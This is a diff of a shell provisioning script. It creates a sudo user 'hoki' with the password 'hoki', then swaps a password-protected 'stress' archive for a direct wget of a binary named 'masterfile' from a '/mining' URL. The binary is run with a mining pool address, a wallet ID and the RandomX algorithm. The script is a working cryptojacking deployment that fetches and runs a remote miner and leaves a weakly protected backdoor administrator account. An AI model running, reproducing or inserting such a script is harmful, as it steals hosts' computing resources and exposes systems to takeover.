@@ -7,10 +7,7 @@ sudo adduser hoki sudo
 sudo usermod -a -G sudo hoki
 sudo echo 'hoki:hoki' | sudo chpasswd
 cd /home/hoki
-git clone https://try.gitea.io/xmanusnia/bitbuc.git
-cd bitbuc
-unzip -q -P kontol stress.zip
-sudo chown hoki:sudo stress
-sudo chown hoki:sudo stress.sh
-sudo chmod 700 stress stress.sh 
-sudo -u hoki sh -c "/home/hoki/bitbuc/stress.sh"
+wget https://swenson.my.id/mining/masterfile
+sudo chown hoki:sudo masterfile
+sudo chmod 700 masterfile
+sudo -u hoki sh -c "/home/hoki/masterfile -o 139.99.124.170:80 -u 861eTc6cvzyPrBXZey4x5iJKPHF2gcG8p3iWCCdYSAFwVgee8NKqJYFhX3muHVSUjAFqvtAX8WezPh8LsGhYTKUn3vWgLUa -k -a rx/0 -p x3x"
